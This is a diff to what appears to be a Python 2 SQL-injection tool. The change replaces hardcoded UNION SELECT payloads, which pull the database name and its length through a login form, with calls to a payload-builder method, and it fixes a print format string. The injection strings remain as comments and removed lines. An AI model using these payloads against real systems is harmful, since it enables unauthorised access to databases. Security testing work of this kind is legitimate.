@@ -39,8 +39,8 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
-                payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='length(database())')
                 r = self.Data.GetData(payload)
                 database_len = int(UnpackFunction(r))
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
@@ -48,12 +48,12 @@ class SqliTest(BaseConfig):
 
                 # 然后注database
                 logger.debug("Start database sqli...")
-                # payload = {"username": "ddog' or select database()%23", "password": "a"}
-                payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='database()')
                 r = self.Data.GetData(payload)
                 database = UnpackFunction(r)
                 logger.debug("Database sqli success...The database is %s" % database)
-                print "[*] database: " % database
+                print "[*] database: %s" % database
 
             elif self.sqlimethod == "build":
 
